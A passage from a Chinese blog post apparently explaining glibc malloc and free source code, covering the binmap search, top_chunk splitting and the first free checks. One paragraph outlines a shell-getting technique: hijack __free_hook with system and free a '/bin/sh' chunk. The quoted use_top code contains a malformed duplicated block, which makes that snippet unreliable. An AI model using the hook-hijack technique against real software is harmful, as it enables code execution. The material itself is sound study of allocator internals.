class="line">bin = bin_at (av, idx);</span><br><span class="line">block = idx2block (idx);</span><br><span class="line"><span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">bit = idx2bit (idx);</span><br></pre></td></tr></table></figure><p>我们来讲一讲<code>arena</code>的<code>binmap</code>结构，这个用于快速检索一个<code>bin</code>是否为空，每一个<code>bit</code>表示对应的<code>bin</code>中是否存在空闲<code>chunk</code>，虽然不知道为什么前面没有用到。这一段就是说，如果<code>large bin</code>搜索完了都没有找到合适的<code>chunk</code>，那么就去下一个<code>idx</code>里面寻找，这很合理。然后一共有4个int，每个<code>int</code>32位表示一块<code>map</code>，一共表示<code>128</code>位。</p><h4 id="第八小块"><a href="#第八小块" class="headerlink" title="第八小块"></a>第八小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(;;)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line"><span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                <span class="keyword">goto</span> use_top;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">        bit = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们来看看两个条件</p><ol><li><code>bit&gt;map</code>：如果这个位的权值都比它整个的<code>map</code>都大了，说明<code>map</code>上那个<code>bit</code>的权值必定为0</li><li><code>bit==0</code>：如果这个<code>bit</code>都是0说明这个<code>index</code>也不对。</li></ol><p>满足其一就看看别的<code>index</code>。</p><p>然后如果说<code>map==0</code>，说明这整个<code>block</code>都没有空闲块，就直接跳过，不为0则退出去执行下面的操作，如果超过了<code>block</code>的总数，那就说明<code>unsorted bin</code>和<code>large bin</code>中也没有合适的<code>chunk</code>，那我们就切割<code>top_chunk</code>了，这里用了一个<code>goto</code>跳转，我们后面分析。</p><h4 id="第九小块"><a href="#第九小块" class="headerlink" title="第九小块"></a>第九小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line"><span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    bin = next_bin (bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">    assert (bit != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">victim = last (bin);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line"><span class="keyword">if</span> (victim == bin)</span><br><span class="line">&#123;</span><br><span class="line">    av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">    bin = next_bin (bin);</span><br><span class="line">    bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时我已经找到了一个合适的<code>block</code>，然后就是看<code>block</code>的各个位了。从低位开始，如果检查到<code>map</code>那一位对应为0就找下一位，我们前面提到bk为<code>large bin</code>的最小块，所以先考虑它，当然不能说<code>map</code>里面说这里有它就有，我还得自己判断一下这个<code>bin</code>里面是不是真的有，如果没有(<code>bin-&gt;bk==bin</code>)，那么我就要及时把标志位清除然后<code>bit&lt;&lt;1</code>去寻找下一个<code>index</code>。</p><h4 id="最后一小块"><a href="#最后一小块" class="headerlink" title="最后一小块"></a>最后一小块</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">    assert ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* unlink */</span></span><br><span class="line">    unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Exhaust */</span></span><br><span class="line">    <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">    &#123;</span><br><span class="line">        set_inuse_bit_at_offset (victim, size);</span><br><span class="line">        <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Split */</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">        have to perform a complete insert here.  */</span></span><br><span class="line">        bck = unsorted_chunks (av);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        remainder-&gt;bk = bck;</span><br><span class="line">        remainder-&gt;fd = fwd;</span><br><span class="line">        bck-&gt;fd = remainder;</span><br><span class="line">        fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">        <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">        &#123;</span><br><span class="line">            remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">            remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">        set_foot (remainder, remainder_size);</span><br><span class="line">    &#125;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果它确实有<code>chunk</code>呢？然后其实它还是跟前面一样的，在<code>large bin</code>中找到<code>chunk</code>的处理方式，<code>unlink</code>，切割，判断，设置标志位，切割后及时更新<code>last_remainder</code>，这里就是一个<code>large bin</code>的遍历。</p><p>还要讲一下的就是这个<code>check</code>，依旧是对<code>unsorted bin</code>的一个<code>check</code>，判断第一个<code>unsorted chunk</code>的<code>bk</code>指针是否指向<code>unsorted bin</code>的位置。这里需要把割剩下的<code>chunk</code>重新放回<code>unsorted bin</code>。至此整个<code>unsorted bin</code>和<code>large bin</code>的分配就讲完了。</p><h3 id="第六段：切割top-chunk"><a href="#第六段：切割top-chunk" class="headerlink" title="第六段：切割top_chunk"></a>第六段：切割top_chunk</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">             (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">             search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">             less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">             be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">             limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">             We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">             MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">             exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">             reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">             to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"></span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line">        av-&gt;top = remainder;</span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                  (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">             here for all block sizes.  */</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">            <span class="comment">/* restore original bin index */</span></span><br><span class="line">            <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                idx = smallbin_index (nb);</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                idx = largebin_index (nb);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">               */</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">            <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">                alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一步比较简单，就是说先从<code>av-&gt;top</code>拿到<code>top_chunk</code>的地址。判断大小尝试切割，如果不能切割，它也不会尽量去麻烦操作系统，先调用<code>malloc_consolidate</code>去合并所有的<code>fast bin</code>里面的<code>chunk</code>。然后合并之后接着步入之前的循环，重新找一次<code>small bin</code> <code>large bin</code> <code>unsorted bin</code>，因为现在可能已经有合适的<code>chunk</code>了对吧。</p><p>然后如果还是没有合适的呢？就会进入这里的<code>else</code>，调用<code>sysmalloc</code>去分配内存，一次还是分配<code>0x21000</code>的<code>chunk</code>作为新的<code>top_chunk</code>，原来的<code>top_chunk</code>将会被<code>free</code>，一般来说如果你没有改过<code>top_chunk</code>的<code>size</code>，那么新的和旧的<code>top_chunk</code>将会是物理相邻，如果<code>free</code> 的<code>top_chunk</code>不在<code>fast bin</code>范围内，那就会和新的<code>top_chunk</code>发生合并。那么这一整个<code>malloc</code>源码就解读完了，我们来做一下总结。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li><p>检查是否设置了<code>malloc_hook</code>，若设置了则跳转进入<code>malloc_hook</code>，若未设置则获取当前的分配区，进入<code>int_malloc</code>函数。</p></li><li><p>如果当前的分配区为空，则调用<code>sysmalloc</code>分配空间，返回指向新<code>chunk</code>的指针，否则进入下一步。</p></li><li><p>若用户申请的大小在<code>fast bin</code>的范围内，则考虑寻找对应<code>size</code>的<code>fast bin chunk</code>，判断该<code>size</code>的<code>fast bin</code>是否为空，不为空则取出第一个<code>chunk</code>返回，否则进入下一步。</p></li><li><p>如果用户申请的大小符合<code>small bin</code>的范围，则在相应大小的链表中寻找<code>chunk</code>，若<code>small bin</code>未初始化，则调用<code>malloc_consolidate</code>初始化分配器，然后继续下面的步骤，否则寻找对应的<code>small bin</code>的链表，如果该<code>size</code> 的<code>small bin</code>不为空则取出返回，否则继续下面的步骤。如果申请的不在<code>small bin</code>的范围那么调用<code>malloc_consolidate</code>去合并所有<code>fast bin</code>并继续下面的步骤。</p></li><li><p>用户申请的大小符合<code>large bin</code>或<code>small bin</code>链表为空，开始处理<code>unsorted bin</code>链表中的<code>chunk</code>。在<code>unsorted bin</code>链表中查找符合大小的<code>chunk</code>，若用户申请的大小为<code>small bin</code>，<code>unsorted bin</code>中只有一块chunk并指向<code>last_remainder</code>，且<code>chunk size</code>的大小大于<code>size+MINSIZE</code>，则对当前的<code>chunk</code>进行分割，更新分配器中的<code>last_remainder</code>，切出的<code>chunk</code>返回给用户，剩余的<code>chunk</code>回<code>unsorted bin</code>。否则进入下一步。</p></li><li><p>将当前的<code>unsorted bin</code>中的<code>chunk</code>取下，若其<code>size</code>恰好为用户申请的<code>size</code>，则将<code>chunk</code>返回给用户。否则进入下一步</p></li><li><p>获取当前<code>chunk size</code>所对应的bins数组中的头指针。（<code>large bin</code>需要保证从大到小的顺序，因此需要遍历）将其插入到对应的链表中。如果处理的chunk的数量大于<code>MAX_ITERS</code>则不在处理。进入下一步。</p></li><li><p>如果用户申请的空间的大小符合<code>large bin</code>的范围或者对应的small bin链表为空且<code>unsorted bin</code>链表中没有符合大小的<code>chunk</code>，则在对应的<code>large bin</code>链表中查找符合条件的<code>chunk</code>（即其大小要大于用户申请的<code>size</code>）。若找到相应的<code>chunk</code>则对<code>chunk</code>进行拆分，返回符合要求的<code>chunk</code>（无法拆分时整块返回）。否则进入下一步。</p></li><li><p>根据<code>binmap</code>找到表示更大<code>size</code>的<code>large bin</code>链表，若其中存在空闲的<code>chunk</code>，则将<code>chunk</code>拆分之后返回符合要求的部分，并更新<code>last_remainder</code>。否则进入下一步。</p></li><li><p>若<code>top_chunk</code>的大小大于用户申请的空间的大小，则将<code>top_chunk</code>拆分，返回符合用户要求的<code>chunk</code>，并更新<code>last_remainder</code>，否则进入下一步。</p></li><li><p>若<code>fast bin</code>不为空，则调用<code>malloc_consolidate</code>合并<code>fast bin</code>，重新回到第四步再次从<code>small bin</code>搜索。否则进入下一步。</p></li><li><p>调用<code>sysmalloc</code>分配空间，<code>free top chunk</code>返回指向新<code>chunk</code>的指针。</p></li><li><p>若<code>_int_malloc</code>函数返回的<code>chunk</code>指针为空，且当前分配区指针不为空，则再次尝试<code>_int_malloc</code></p></li><li><p>对<code>chunk</code>指针进行检查，主要检查<code>chunk</code>是否为<code>mmap</code>，且位于当前的分配区内。</p><h2 id="free源码分析"><a href="#free源码分析" class="headerlink" title="free源码分析"></a>free源码分析</h2></li></ol><p>那我们现在开始解读一下<code>free</code>的源码</p><h3 id="libc-free源码分析"><a href="#libc-free源码分析" class="headerlink" title="__libc_free源码分析"></a>__libc_free源码分析</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>free</code>函数也是直接调用这里的<code>__libc_free</code>函数完成<code>chunk</code>的释放的操作的。</p><p>跟<code>malloc</code>一样，先读取<code>__free_hook</code>看看是否为空，如果为空则直接由<code>free_hook</code>指向的函数代为执行<code>free</code>，这里也是我们经常劫持的钩子函数，而且<code>free_hook</code>劫持起来比<code>malloc_hook</code>困难。但是一旦劫持成功也会很方便，就是说<code>malloc</code>_hook函数我只能写<code>one_gadget</code>，而一旦条件苛刻那么就还得调栈啊之类的一些操作。劫持到了<code>free_hook</code>我们就直接写<code>system</code>函数，然后<code>free</code>一个内容为<code>/bin/sh</code>的堆块就能稳定<code>get shell</code>。</p><p>然后执行<code>free(NULL)</code>无任何效果，直接返回。</p><p>将传入的指针转换为<code>chunk</code>的指针，因为用户得到的指针其实是<code>&amp;chunk-&gt;fd</code>，这里改为<code>chunk</code>的指针。然后这里需要寻找这个堆块的分配器，看看这个堆块是从哪里分配出来的。之后就是调用<code>_int_free</code>函数去真正释放chunk</p><h3 id="int-free源码分析"><a href="#int-free源码分析" class="headerlink" title="_int_free源码分析"></a>_int_free源码分析</h3><p>同样我们分成几段来讲解，总源码也不直接给了。</p><h4 id="第一段：free前的各种check"><a href="#第一段：free前的各种check" class="headerlink" title="第一段：free前的各种check"></a>第一段：free前的各种check</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> misaligned_chunk(p) \</span></span><br><span class="line"><span class="meta">  ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem (p)) \</span></span><br><span class="line"><span class="meta">   &amp; MALLOC_ALIGN_MASK)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> chunksize(p)         ((p)-&gt;size &amp; ~(SIZE_BITS))</span></span><br><span class="line">INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line"><span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">int</span> locked = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">size = chunksize (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">     allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">     Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">     here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">        (<span class="keyword">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure><p>首先变量定义是差不多的，然后这里进行了一项<code>check</code>。</p><ol><li><code>(uintptr_t) p &gt; (uintptr_t) -size</code>：这里让我有点费解，指针和size进行比较。通常情况下size取负之后会变得很大，比如<code>0xfff...</code>这样的大数值通常指针不会指向这样的地址，f开头的一般都是内核地址。所以<code>p&gt;0xfff....</code>主要是应该要检测被<code>free</code>的<code>chunk</code>的<code>size</code>不要过大。</li><li><code>misaligned_chunk (p)</code>：这里的话主要是这个<code>chunk</code>的指针与上掩码，掩码就是<code>0x10-1</code>也就是<code>0xf</code>，取出后四位观察是否为0，如果不为0则说明指针错误了，机会在这里报错。这里主要是检查对齐，指针需要指到<code>0x10</code>的整倍数的<code>chunk</code>才能被正常<code>free</code>，就是不知道<code>malloc</code>为什么不开这个检测，开了又有一大批利用手段用不了了(狗头。</li></ol><p><code>check</code>不通过就会用<code>malloc_printerr</code>打印错误信息，然后处理锁上的一些内容。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> aligned_OK(m)  (((unsigned long)(m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"><span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">     multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_inuse_chunk(av, 